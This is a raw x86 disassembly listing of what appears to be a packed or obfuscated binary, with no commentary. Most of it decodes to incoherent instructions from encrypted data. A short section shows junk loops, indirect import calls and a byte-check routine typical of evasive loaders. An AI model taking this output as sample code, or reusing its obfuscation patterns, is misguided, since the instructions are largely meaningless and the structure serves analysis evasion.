  416f7d:	int3   
  416f7e:	jno    0x416fbd
  416f80:	dec    eax
  416f81:	es dec edi
  416f83:	push   ss
  416f84:	mov    ds:0x1ce8864c,al
  416f89:	sub    al,BYTE PTR [ebx]
  416f8b:	in     al,dx
  416f8c:	push   edi
  416f8d:	xor    cl,BYTE PTR [edx]
  416f8f:	pop    edi
  416f90:	cmovns ebx,DWORD PTR [ebp-0x35]
  416f94:	pop    esi
  416f95:	sbb    al,0x3d
  416f97:	aam    0x83
  416f99:	cmp    BYTE PTR [eax],0x39
  416f9c:	test   eax,0x901882c7
  416fa1:	push   0x4b25c2ef
  416fa6:	mov    eax,0xa8bbebd5
  416fab:	jle    0x417004
  416fad:	pop    ebp
  416fae:	hlt    
  416faf:	or     BYTE PTR [eax+esi*2-0x7f],dh
  416fb3:	and    edx,DWORD PTR [edx-0x60c243e0]
  416fb9:	enter  0x43b6,0xed
  416fbd:	and    al,0x23
  416fbf:	and    ebx,esp
  416fc1:	mov    esp,0x4e9caa69
  416fc6:	sbb    al,BYTE PTR [ebx]
  416fc8:	jnp    0x416fea
  416fca:	inc    esi
  416fcb:	ins    DWORD PTR es:[edi],dx
  416fcc:	xor    al,al
  416fce:	daa    
  416fcf:	push   es
  416fd0:	sub    al,0x5b
  416fd2:	adc    ecx,esi
  416fd4:	stos   DWORD PTR es:[edi],eax
  416fd5:	or     ebp,DWORD PTR [esi-0x30]
  416fd8:	jle    0x416fae
  416fda:	out    0x18,al
  416fdc:	jmp    0x417058
  416fde:	adc    eax,0x92fea0b
  416fe3:	xchg   edi,eax
  416fe4:	daa    
  416fe5:	shl    BYTE PTR [ecx-0x7685d678],cl
  416feb:	iret   
  416fec:	aaa    
  416fed:	bound  eax,QWORD PTR [edi+0x1bee3e47]
  416ff3:	mov    bl,0x17
  416ff5:	mov    ds:0x45f8c8cc,eax
  416ffa:	cld    
  416ffb:	jo     0x417074
  416ffd:	ins    DWORD PTR es:[edi],dx
  416ffe:	mov    DWORD PTR [edx+0xe750c5a],esi
  417004:	scas   al,BYTE PTR es:[edi]
  417005:	push   ebx
  417006:	and    DWORD PTR [edi],ecx
  417008:	xchg   ecx,eax
  417009:	das    
  41700a:	and    DWORD PTR [edx],ebx
  41700c:	ret    
  41700d:	xor    bl,BYTE PTR [esi]
  41700f:	arpl   WORD PTR [eax+0x63],bp
  417012:	outs   dx,BYTE PTR ds:[esi]
  417013:	gs (bad) 
  417015:	push   ebx
  417016:	test   BYTE PTR [edx+ebx*8-0xa83d3bf],ah
  41701d:	imul   ecx,DWORD PTR [ebx],0xffffffd1
  417020:	cmp    DWORD PTR [ecx+0x3e7cf8e5],esp
  417026:	imul   edi,DWORD PTR [ecx],0x2b
  417029:	imul   esi,DWORD PTR [edx-0x28],0xffffffa2
  41702d:	scas   eax,DWORD PTR es:[edi]
  41702e:	inc    edi
  41702f:	enter  0x8446,0xac
  417033:	sbb    dh,BYTE PTR [ecx+0x3e]
  417036:	pusha  
  417037:	sub    DWORD PTR [ebp-0x14949966],eax
  41703d:	xchg   ebp,eax
  41703e:	mov    DWORD PTR [eax+0x3c5c4054],ebx
  417044:	adc    DWORD PTR [edi+0x3e],esi
  417047:	ins    DWORD PTR es:[edi],dx
  417048:	mov    eax,0x52a75607
  41704d:	jmp    0xc603:0xe6ea4b89
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi-0x5302545],edx
  41706d:	out    0x45,eax
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x4170a8
  417077:	push   edi
  417078:	out    dx,eax
  417079:	(bad)
  41707e:	aas    
  41707f:	mov    ecx,0xe09593
  417084:	xchg   esi,eax
  417085:	cli    
  417086:	(bad)  
  417087:	scas   al,BYTE PTR es:[edi]
  417088:	fisub  DWORD PTR [edx]
  41708a:	nop
  41708b:	xlat   BYTE PTR ds:[ebx]
  41708c:	push   edx
  41708d:	mov    eax,ds:0x8ebecb33
  417092:	fs cmp al,0xac
  417095:	inc    ebp
  417096:	sbb    eax,0x1151c61c
  41709b:	ss mov ebx,cs
  41709e:	js     0x4170d5
  4170a0:	lea    ebx,[edi+0x13174b03]
  4170a6:	jnp    0x417081
  4170a8:	add    DWORD PTR [edi+0x4cc4ee45],edx
  4170ae:	mov    BYTE PTR [eax-0x4],0x2a
  4170b2:	dec    edi
  4170b3:	sub    al,BYTE PTR [eax+0x3c]
  4170b6:	loop   0x4170e9
  4170b8:	(bad)  
  4170ba:	ret    
  4170bb:	push   ebx
  4170bc:	out    0x8b,eax
  4170be:	xor    eax,0x17e32e6c
  4170c3:	stos   DWORD PTR es:[edi],eax
  4170c4:	imul   edi,DWORD PTR [ecx-0x7d4a0ff2],0xedd3f807
  4170ce:	fwait
  4170cf:	mov    ds:0xcdf76230,eax
  4170d4:	sbb    DWORD PTR [ebp-0x6072a75d],edx
  4170da:	jnp    0x4170de
  4170dc:	pop    esi
  4170dd:	idiv   BYTE PTR [esi+eax*2]
  4170e0:	ror    DWORD PTR [edx],cl
  4170e2:	push   esi
  4170e3:	add    eax,0x88847f1
  4170e8:	mov    ah,0x8c
  4170ea:	push   edi
  4170eb:	mov    al,0x5e
  4170ed:	dec    esp
  4170ee:	cmp    BYTE PTR [ebx-0x2d356185],ah
  4170f4:	bound  eax,QWORD PTR [ebx-0x76042eeb]
  4170fa:	mov    ch,0x60
  4170fc:	ss popf 
  4170fe:	into   
  4170ff:	mov    edi,0x2c5cdf93
  417104:	jmp    0x4170b1
  417106:	loopne 0x4170f1
  417108:	stos   DWORD PTR es:[edi],eax
  417109:	sbb    bh,ch
  41710b:	add    BYTE PTR [edi],ch
  41710d:	daa    
  41710e:	mov    bl,0x34
  417110:	or     ebp,DWORD PTR [ecx]
  417112:	ins    DWORD PTR es:[edi],dx
  417113:	vprotq ymm15,[esp+r13d*4],xmm6
  417119:	fsubr  DWORD PTR ds:0x2a9f27ed
  41711f:	pop    ss
  417120:	mov    al,0xb0
  417122:	cli    
  417123:	pop    eax
  417124:	ss pop es
  417126:	mov    dh,0x4d
  417128:	mov    dh,0xb8
  41712a:	stos   BYTE PTR es:[edi],al
  41712b:	mov    ds:0x8ccc9371,al
  417130:	sti    
  417131:	arpl   bx,bx
  417133:	jp     0x4170d8
  417135:	cmp    BYTE PTR [edx],cl
  417137:	add    BYTE PTR [ebx-0xb95ad59],0xc5
  41713e:	repz ja 0x41716f
  417141:	(bad)
  417144:	aam    0x78
  417146:	cmp    BYTE PTR [edi-0x2a5dfa26],dh
  41714c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41714d:	jbe    0x417183
  41714f:	xchg   ebx,eax
  417150:	mov    ch,0x98
  417152:	jne    0x417131
  417154:	sub    eax,0xfa6559af
  417159:	sbb    ah,BYTE PTR fs:[ebx-0x1c]
  41715d:	lods   al,BYTE PTR ds:[esi]
  41715e:	jmp    0x19b6:0x7313ca50
  417165:	cmp    ecx,DWORD PTR [ebx+edi*2+0x4c955e93]
  41716c:	adc    ch,dl
  41716e:	out    0xa6,al
  417170:	rcl    BYTE PTR [edx],1
  417172:	and    DWORD PTR [edx+0x790805bd],0xffffff82
  417179:	ret    
  41717a:	data16 into 
  41717c:	mov    ds:0x222902de,eax
  417181:	(bad)  
  417182:	ins    DWORD PTR es:[edi],dx
  417183:	imul   ebx,esi,0x15ca8621
  417189:	fcomp  DWORD PTR [eax+edi*1]
  41718c:	(bad)  [esi-0x3]
  41718f:	mov    ch,0x29
  417191:	icebp  
  417192:	or     eax,0xe435d658
  417197:	rol    dh,0x67
  41719a:	xor    edi,DWORD PTR [edx+0x39]
  41719d:	aas    
  41719e:	add    bl,BYTE PTR [eax]
  4171a0:	jg     0x417209
  4171a2:	sahf   
  4171a3:	add    ch,ch
  4171a5:	jmp    0x417202
  4171a7:	inc    ecx
  4171a8:	push   esp
  4171a9:	jno    0x41719a
  4171ab:	or     BYTE PTR [ebx+ebx*4+0x6a],bh
  4171af:	mov    al,ds:0x47307ec9
  4171b4:	arpl   di,di
  4171b6:	xchg   ebp,eax
  4171b7:	lods   al,BYTE PTR ds:[esi]
  4171b8:	ins    DWORD PTR es:[edi],dx
  4171b9:	out    dx,al
  4171ba:	xchg   BYTE PTR ds:0x2f2d3e80,bh
  4171c0:	inc    esp
  4171c1:	jge    0x4171aa
  4171c3:	sub    eax,0xc5e76b6e
  4171c8:	cmp    BYTE PTR [eax-0x4aca16d6],al
  4171ce:	xchg   DWORD PTR [esi+ecx*1-0x58],edi
  4171d2:	aam    0x3a
  4171d4:	adc    esi,DWORD PTR [edx]
  4171d6:	fild   WORD PTR [edx+0x45]
  4171d9:	retf   0x5087
  4171dc:	adc    cl,dl
  4171de:	add    cl,BYTE PTR [esi-0x7cb60352]
  4171e4:	int3   
  4171e5:	aad    0x85
  4171e7:	xchg   BYTE PTR [ebp-0x54],dl
  4171ea:	jne    0x41726b
  4171ec:	adc    dl,BYTE PTR ds:0x7ec35af0
  4171f2:	icebp  
  4171f3:	ficomp DWORD PTR [ebx+0x68a915cd]
  4171f9:	sbb    DWORD PTR [ebp-0x32],eax
  4171fc:	sbb    DWORD PTR [edi-0x74],0xffffffe6
  417200:	mov    eax,ds:0x9bc4f5fa
  417205:	dec    eax
  417206:	xchg   DWORD PTR [ebx],esi
  417208:	adc    DWORD PTR [ebx],ebx
  41720a:	and    BYTE PTR [ebp+0xaa39511],bh
  417210:	sbb    DWORD PTR [edx+0x30ef75bc],eax
  417216:	mov    dh,0x60
  417218:	sti    
  417219:	jmp    0x417255
  41721b:	mov    DWORD PTR [ecx+eiz*4-0x55],eax
  41721f:	mov    dh,ch
  417221:	adc    al,0x11
  417223:	xor    esi,DWORD PTR [edx-0x275c523b]
  417229:	inc    ebp
  41722a:	scas   eax,DWORD PTR es:[edi]
  41722b:	and    eax,0x979514b2
  417230:	and    eax,0x1be8b016
  417235:	mov    ch,0x9d
  417237:	or     al,0x30
  417239:	cmp    ah,al
  41723b:	dec    ebp
  41723c:	or     eax,0xa237055b
  417241:	xor    eax,0x6623563e
  417246:	adc    BYTE PTR [ebp+0x76c11996],0xd5
  41724d:	cmp    BYTE PTR [edx-0x39],0x40
  417251:	cs xchg edi,eax
  417253:	sbb    BYTE PTR [ecx-0x19f0c666],0x22
  41725a:	mov    ah,BYTE PTR [edi+0x340c59a1]
  417260:	ror    BYTE PTR [esi+0x101bbd71],1
  417266:	sahf   
  417267:	fs lahf 
  417269:	xor    edx,DWORD PTR [esi-0x42]
  41726c:	es repnz (bad) 
  41726f:	jle    0x417213
  417271:	pop    esi
  417272:	dec    ebp
  417273:	rcl    BYTE PTR [ecx+ebx*8],0x2e
  417277:	rol    ah,cl
  417279:	mov    WORD PTR [eax+0x71b6c016],cs
  41727f:	out    dx,al
  417280:	sub    al,0x83
  417282:	(bad)  
  417283:	in     eax,0xc6
  417285:	jmp    0x5db7:0xe3a8a1f1
  41728c:	jmp    0x4172d2
  41728e:	mov    al,ds:0x68e2a61a
  417293:	xchg   ebp,eax
  417294:	mov    dl,0xee
  417296:	and    ecx,DWORD PTR [edx+0x7]
  417299:	call   0x2a552f5
  41729e:	mov    bl,0x55
  4172a0:	das    
  4172a1:	(bad)  
  4172a2:	test   eax,0x375d9b3f
  4172a7:	xchg   edx,eax
  4172a8:	inc    eax
  4172a9:	push   ds
  4172aa:	inc    edx
  4172ab:	lods   al,BYTE PTR ds:[esi]
  4172ac:	leave  
  4172ad:	out    dx,eax
  4172ae:	lods   eax,DWORD PTR ds:[esi]
  4172af:	out    dx,al
  4172b0:	or     ecx,DWORD PTR [esi-0x11]
  4172b3:	mov    ds:0x7939b4d1,al
  4172b8:	inc    ebx
  4172b9:	mov    cs,WORD PTR [ecx-0x5b]
  4172bc:	push   ebp
  4172bd:	call   FWORD PTR [ecx+ebp*2+0x388edb88]
  4172c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172c5:	inc    esp
  4172c6:	adc    bl,bl
  4172c8:	fld    st(5)
  4172ca:	iret   
  4172cb:	xor    BYTE PTR [ebx],0x77
  4172ce:	mov    eax,0x6f399280
  4172d3:	pop    esi
  4172d4:	xchg   edi,eax
  4172d5:	test   BYTE PTR [edx],0xee
  4172d8:	push   ss
  4172d9:	fld    QWORD PTR [edx+0x39]
  4172dc:	inc    ebp
  4172dd:	dec    esp
  4172de:	hlt    
  4172df:	cwde   
  4172e0:	fs jmp 0x3cf9:0x2f82998e
  4172e8:	fild   WORD PTR [eax-0x103650a7]
  4172ee:	jnp    0x4172be
  4172f0:	adc    eax,0x5bf76c71
  4172f5:	xchg   ecx,eax
  4172f6:	repz test eax,0xef5cfb40
  4172fc:	or     eax,0xecfc47d8
  417301:	sub    DWORD PTR [edx+0x2d],eax
  417304:	sti    
  417305:	call   0x73f1:0x8292773
  41730c:	dec    esi
  41730d:	mov    al,ds:0xff0fc179
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	sar    BYTE PTR [edi-0x9],1
  417335:	add    BYTE PTR [edx+eiz*8-0x6a8780d8],bh
  41733c:	jle    0x4173b6
  41733e:	js     0x4172cf
  417340:	push   esi
  417341:	pusha  
  417342:	mov    WORD PTR [edx],?
  417344:	aaa    
  417345:	push   0x9d13086e
  41734a:	cmovo  edi,DWORD PTR [ebx+0x75]
  41734e:	stos   BYTE PTR es:[edi],al
  41734f:	mov    ebx,ebx
  417351:	std    
  417352:	ins    DWORD PTR es:[edi],dx
  417353:	jmp    0x4173b0
  417355:	addr16 dec edi
  417357:	mov    cl,0x34
  417359:	(bad)  
  41735b:	(bad)  [ebx+0x6c]
  41735e:	push   0x845820b8
  417363:	inc    ebp
  417364:	enter  0x8fbe,0x2a
  417368:	out    0x82,eax
  41736a:	out    dx,al
  41736b:	or     BYTE PTR [ebx+eax*1+0x371739a3],dh
  417372:	pop    ss
  417373:	pushf  
  417374:	xchg   esp,eax
  417375:	cvtps2pi mm2,QWORD PTR [ebx-0x33]
  417379:	push   edx
  41737a:	push   cs
  41737b:	sub    BYTE PTR [eax+ecx*4+0x6584fd53],ah
  417382:	mov    ebp,0xf10136c5
  417387:	pop    ss
  417388:	inc    esp
  417389:	xchg   DWORD PTR [edx],eax
  41738b:	loop   0x41737d
  41738d:	inc    ebp
  41738e:	neg    BYTE PTR [ecx+0x1]
  417391:	enter  0x30df,0xca
  417395:	(bad)  
  417397:	sbb    ch,BYTE PTR [edi+0x51]
  41739a:	xor    BYTE PTR [ebx],ah
  41739c:	xchg   ebx,eax
  41739d:	dec    ebx
  41739e:	push   0x25
  4173a0:	xor    cl,BYTE PTR [eax-0x1c4ea3cd]
  4173a6:	sub    ecx,DWORD PTR [ebp-0x6a]
  4173a9:	repz fs das 
  4173ac:	push   ebp
  4173ad:	dec    edx
  4173ae:	adc    edi,ebx
  4173b0:	pop    edx
  4173b1:	sub    BYTE PTR [edx-0x3d],dh
  4173b4:	in     al,0xdd
  4173b6:	adc    BYTE PTR [edi],bh
  4173b8:	aam    0x44
  4173ba:	nop
  4173bb:	mov    cl,0x81
  4173bd:	je     0x4173f9
  4173bf:	mov    ebp,0x85c6000c
  4173c4:	and    al,0x18
  4173c6:	cwde   
  4173c7:	add    DWORD PTR [ebp-0x2f1c7645],eax
  4173cd:	push   ss
  4173ce:	adc    edi,0xc37c16a8
  4173d4:	cli    
  4173d5:	or     al,0x1e
  4173d7:	and    eax,0xd5305684
  4173dc:	popf   
  4173dd:	jecxz  0x4173dc
  4173df:	(bad)  
  4173e0:	stc    
  4173e1:	cld    
  4173e2:	(bad)  
  4173e3:	data16 or BYTE PTR [eax],0xd6
  4173e7:	inc    esp
  4173e8:	lods   eax,DWORD PTR ds:[esi]
  4173e9:	aad    0x55
  4173eb:	ss dec esi
  4173ed:	push   es
  4173ee:	inc    edi
  4173ef:	mov    eax,ds:0x50d292fa
  4173f4:	jmp    0x41738b
  4173f6:	enter  0x2586,0x57
  4173fa:	mov    esp,0x81cb88b9
  4173ff:	add    eax,0x4f9ee361
  417404:	inc    esp
  417405:	mov    ch,0x5f
  417407:	test   eax,0x16179323
  41740c:	enter  0x3f28,0x96
  417410:	test   al,0xe6
  417412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417413:	aas    
  417414:	add    DWORD PTR [eax],0xfffffff9
  417417:	rcr    DWORD PTR [ebx],1
  417419:	dec    esp
  41741a:	xchg   esi,eax
  41741b:	sbb    eax,0xeb21053f
  417420:	lods   eax,DWORD PTR ds:[esi]
  417421:	and    eax,eax
  417423:	or     ecx,eax
  417425:	out    0xa,eax
  417427:	mov    BYTE PTR ds:0x2dc0e1e2,al
  41742d:	pop    esp
  41742e:	lea    ebx,ds:0xf9049bda
  417434:	fnop   
  417436:	and    DWORD PTR [edx],0x28
  417439:	cwde   
  41743a:	xchg   esp,eax
  41743b:	inc    ah
  41743d:	ret    0xe80a
  417440:	aam    0x5
  417442:	popf   
  417443:	shl    BYTE PTR fs:[bp+di+0x258f],1
  417449:	pusha  
  41744a:	jl     0x4174b5
  41744c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41744d:	mov    DWORD PTR [esi-0x3ce2490d],edi
  417453:	jae    0x41744f
  417455:	in     al,0xa1
  417457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417458:	mov    al,gs:0xdb27421
  41745e:	dec    ecx
  41745f:	das    
  417460:	sub    DWORD PTR [ebp+ebp*8+0x52],ecx
  417464:	ret    
  417465:	vminps xmm1,xmm5,XMMWORD PTR [eax]
  417469:	dec    ebx
  41746a:	(bad)  
  41746b:	dec    ecx
  41746c:	mov    DWORD PTR ds:0xef7c0207,edx
  417472:	sub    BYTE PTR [edi-0x52],ch
  417475:	add    DWORD PTR [esi],eax
  417477:	ds fld1 
  41747a:	ja     0x4174e5
  41747c:	fld    DWORD PTR [esi+0x7b]
  41747f:	mov    ebx,0xde408411
  417484:	pop    eax
  417485:	cmp    DWORD PTR [edx-0x43219d85],ebp
  41748b:	pop    ds
  41748c:	lds    ecx,FWORD PTR [ebx-0x61]
  41748f:	jmp    0xdcb848a4
  417494:	loop   0x41745c
  417496:	mov    ds:0xb99cc807,al
  41749b:	loop   0x417442
  41749d:	or     edx,DWORD PTR [eax]
  41749f:	sub    cl,BYTE PTR [edi+0x6716eb88]
  4174a5:	pop    ecx
  4174a6:	imul   esi,DWORD PTR [edx],0x6e902e09
  4174ac:	cmp    DWORD PTR [ecx],esi
  4174ae:	mov    ah,0xc5
  4174b0:	sub    cl,bl
  4174b2:	push   eax
  4174b3:	lods   eax,DWORD PTR ds:[esi]
  4174b4:	(bad)
  4174b8:	mov    eax,0x51ce5746
  4174bd:	lods   eax,DWORD PTR ds:[esi]
  4174be:	pop    eax
  4174bf:	pop    edi
  4174c0:	inc    esi
  4174c1:	neg    DWORD PTR [ebp+0x12]
  4174c4:	sti    
  4174c5:	sahf   
  4174c6:	sbb    bh,BYTE PTR [ebx+0x7fcfef18]
  4174cc:	fild   DWORD PTR [ecx-0x23ffdaca]
  4174d2:	add    al,0x42
  4174d4:	adc    BYTE PTR [ebp*2-0x2cb894a3],al
  4174db:	push   ds
  4174dc:	mov    al,ds:0x8b80a88d
  4174e1:	xchg   edx,eax
  4174e2:	outs   dx,DWORD PTR ds:[esi]
  4174e3:	adc    edx,DWORD PTR [ebx+eax*2+0xc]
  4174e7:	div    BYTE PTR [edi-0x7f]
  4174ea:	mov    BYTE PTR [edi+0x52],0xd6
  4174ee:	lods   eax,DWORD PTR ds:[esi]
  4174ef:	enter  0x3d79,0x88
  4174f3:	ja     0x417558
  4174f5:	mov    ds:0x683f3606,eax
  4174fa:	ret    0x761a
  4174fd:	arpl   WORD PTR [edx+edx*8+0x1b7142d7],bx
  417504:	(bad)  
  417505:	dec    ebp
  417506:	shl    ecx,cl
  417508:	(bad)  
  417509:	xchg   edi,eax
  41750a:	fld    QWORD PTR [edx-0xa]
  41750d:	jbe    0x417535
  41750f:	mov    esp,0x2ac134ae
  417514:	or     al,0xd1
  417516:	out    dx,eax
  417517:	daa    
  417518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417519:	or     cl,BYTE PTR fs:[edi-0xd21cba3]
  417520:	or     al,ah
  417522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417523:	std    
  417524:	mov    ecx,0x87896e69
  417529:	cdq    
  41752a:	and    esi,DWORD PTR [edi+0x1a]
  41752d:	push   0xfbdb8813
  417532:	(bad)
  417536:	or     dh,cl
  417538:	pusha  
  417539:	mov    eax,ss
  41753b:	loopne 0x41759d
  41753d:	mov    al,ds:0xe0d62e59
  417542:	imul   esi,ebx,0xffffffb0
  417545:	lock xor bl,bh
  417548:	fadd   DWORD PTR [esi]
  41754a:	sbb    BYTE PTR [ecx+0x1894d532],0xf0
  417551:	xchg   eax,esi
  417553:	in     eax,dx
  417554:	or     ah,BYTE PTR [eax+0x2ccf3e7a]
  41755a:	inc    ebp
  41755b:	xchg   BYTE PTR [ecx],dh
  41755d:	loope  0x417532
  41755f:	fcomp  QWORD PTR [edi+0x2f0401df]
  417565:	mov    al,ds:0xba6f6c2e
  41756a:	(bad)  
  41756b:	aas    
  41756c:	or     bh,al
  41756e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41756f:	xchg   edx,eax
  417570:	fldenv [ebx]
  417572:	daa    
  417573:	int3   
  417574:	or     al,0x24
  417576:	inc    esp
  417577:	xlat   BYTE PTR cs:[ebx]
  417579:	mov    eax,ds:0x3658c8e2
  41757e:	sub    BYTE PTR [ebx-0x778a1916],dh
  417584:	hlt    
  417585:	pop    esi
  417586:	or     DWORD PTR [edx+0x1888f49],eax
  41758c:	fsubr  DWORD PTR [ebp+0x43]
  41758f:	and    DWORD PTR ds:0x58da77d,esp
  417596:	mov    WORD PTR [ebp+eax*4+0x3c],cs
  41759a:	mov    ecx,0xdaf16760
  41759f:	ins    DWORD PTR es:[edi],dx
  4175a0:	lea    edx,cs:[edi]
  4175a3:	adc    eax,0xfc61f217
  4175a8:	push   ss
  4175a9:	sub    BYTE PTR [edx+0x69f5e175],dl
  4175af:	pop    ss
  4175b0:	daa    
  4175b1:	xchg   edi,eax
  4175b2:	pop    esp
  4175b3:	jnp    0x41755e
  4175b5:	sub    eax,0x8c5f925f
  4175ba:	mov    esi,0xb9e6b9e
  4175bf:	xchg   ebx,eax
  4175c0:	gs dec ebp
  4175c2:	xor    bl,ah
  4175c4:	push   es
  4175c5:	pop    ebx
  4175c6:	fnsave [ebp+0x68cd8aab]
  4175cc:	outs   dx,BYTE PTR ds:[esi]
  4175cd:	pop    ecx
  4175ce:	jle    0x417562
  4175d0:	add    DWORD PTR [ebp-0x38a07d4e],0x18639636
  4175da:	add    eax,esi
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	xor    esi,DWORD PTR [eax+esi*1]
  4176bd:	pop    ecx
  4176be:	jg     0x4176ed
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0xe478787e
  4176c7:	add    DWORD PTR [edi-0x10acc6f9],edx
  4176cd:	int    0xcc
  4176cf:	xchg   edi,eax
  4176d0:	sbb    ebx,DWORD PTR [ebp+0x31]
  4176d3:	xor    edi,0xffffffb1
  4176d6:	nop
  4176d7:	inc    ebp
  4176d8:	sub    eax,0x98391672
  4176dd:	xchg   ebp,eax
  4176de:	or     al,BYTE PTR [ebp-0xd]
  4176e1:	mov    ecx,0xbb09e7b0
  4176e6:	aad    0x66
  4176e8:	push   ss
  4176e9:	adc    BYTE PTR [edi],dl
  4176eb:	sbb    edx,DWORD PTR [ecx+0x34]
  4176ee:	hlt    
  4176ef:	pop    es
  4176f0:	loop   0x417685
  4176f2:	adc    BYTE PTR [ebx+eiz*4-0x2599dbf6],dh
  4176f9:	int    0x39
  4176fb:	in     al,0x4d
  4176fd:	xchg   ecx,eax
  4176fe:	lahf   
  4176ff:	mov    WORD PTR [edi],?
  417701:	stos   BYTE PTR es:[edi],al
  417702:	cmp    edx,ecx
  417704:	ds popa 
  417706:	aad    0xb2
  417708:	inc    eax
  417709:	call   0x15e74cf6
  41770e:	mov    ebp,0x778542d2
  417713:	add    esp,esi
  417715:	out    dx,al
  417716:	jbe    0x41778b
  417718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417719:	pop    ebp
  41771a:	jb     0x41771a
  41771c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41771d:	inc    esp
  41771e:	or     DWORD PTR [eax],eax
  417720:	scas   al,BYTE PTR es:[edi]
  417721:	jb     0x4176b3
  417723:	scas   eax,DWORD PTR es:[edi]
  417724:	lods   al,BYTE PTR ds:[esi]
  417725:	xchg   edx,eax
  417726:	arpl   WORD PTR [ebp+0x35],ax
  417729:	mov    ebx,0x669f9580
  41772e:	(bad)  
  41772f:	push   edx
  417730:	loop   0x4177af
  417732:	mov    eax,ds:0xa585095b
  417737:	in     eax,0xcc
  417739:	mov    ch,0x8c
  41773b:	xchg   esi,eax
  41773c:	outs   dx,BYTE PTR ds:[esi]
  41773d:	sbb    esp,edi
  41773f:	pop    es
  417740:	sub    ah,BYTE PTR [edx+ecx*4-0x28]
  417744:	rol    ecx,0x71
  417747:	mov    BYTE PTR [esi-0x55],al
  41774a:	push   ecx
  41774b:	inc    edx
  41774c:	rol    bh,cl
  41774e:	jg     0x4177bb
  417750:	pop    DWORD PTR [ecx+0xc69e055]
  417756:	or     DWORD PTR [eax],ebx
  417758:	inc    ebx
  417759:	jb     0x4177af
  41775b:	xor    eax,0xdfc61492
  417760:	mov    ah,0x99
  417762:	je     0x417718
  417764:	ret    0x9f90
  417767:	sar    esp,cl
  417769:	xchg   esi,eax
  41776a:	mov    bl,BYTE PTR [eax]
  41776c:	popf   
  41776d:	mov    eax,ds:0xca7c1855
  417772:	push   edx
  417773:	lods   eax,DWORD PTR ds:[esi]
  417774:	sub    eax,0x6be668bb
  417779:	call   0xd3e350f5
  41777e:	cmp    al,BYTE PTR [esi]
  417780:	jae    0x417786
  417782:	xchg   edx,eax
  417783:	jp     0x4177dc
  417785:	jge    0x4177cd
  417787:	mov    bh,ch
  417789:	pop    esp
  41778a:	pop    es
  41778b:	sbb    al,BYTE PTR [edx]
  41778d:	imul   ebp,esp,0x30
  417790:	scas   eax,DWORD PTR es:[edi]
  417791:	outs   dx,DWORD PTR ds:[esi]
  417792:	std    
  417793:	cld    
  417794:	push   edx
  417795:	in     al,0xf8
  417797:	mov    ecx,0xd3d4f416
  41779c:	pop    ss
  41779d:	ds cld 
  41779f:	adc    ah,bl
  4177a1:	pushf  
  4177a2:	add    DWORD PTR [ecx-0x1639ecfe],edx
  4177a8:	sub    esi,ecx
  4177aa:	out    0x90,al
  4177ac:	mov    esp,0x8e758bfe
  4177b1:	jno    0x4177ee
  4177b3:	jecxz  0x4177c0
  4177b5:	fs xchg esp,eax
  4177b7:	mov    edi,0x10485fe0
  4177bc:	and    ah,BYTE PTR [edx-0x2c]
  4177bf:	in     al,0x11
  4177c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177c2:	ins    BYTE PTR es:[edi],dx
